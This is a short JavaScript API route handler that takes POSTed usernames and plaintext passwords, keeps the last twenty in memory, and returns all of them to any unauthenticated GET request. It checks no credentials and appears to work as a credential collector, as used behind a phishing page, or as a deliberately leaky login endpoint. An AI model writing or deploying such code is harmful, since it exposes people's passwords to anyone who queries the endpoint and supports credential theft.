let loginAttempts = [];

export default function handler(req, res) {
  if (req.method === "POST") {
    const { username, password } = req.body;

    if (
      typeof username !== "string" ||
      typeof password !== "string" ||
      !username.trim() ||
      !password.trim()
    ) {
      return res
        .status(400)
        .json({ success: false, message: "Invalid username or password" });
    }

    loginAttempts.unshift({
      username,
      password,
      timestamp: Date.now(),
    });

    if (loginAttempts.length > 20) loginAttempts.pop();

    return res.json({ success: true, message: "Stored login attempt" });
  }

  if (req.method === "GET") {
    return res.json({ success: true, logins: loginAttempts });
  }

  res.setHeader("Allow", ["GET", "POST"]);
  res.status(405).end(`Method ${req.method} Not Allowed`);
}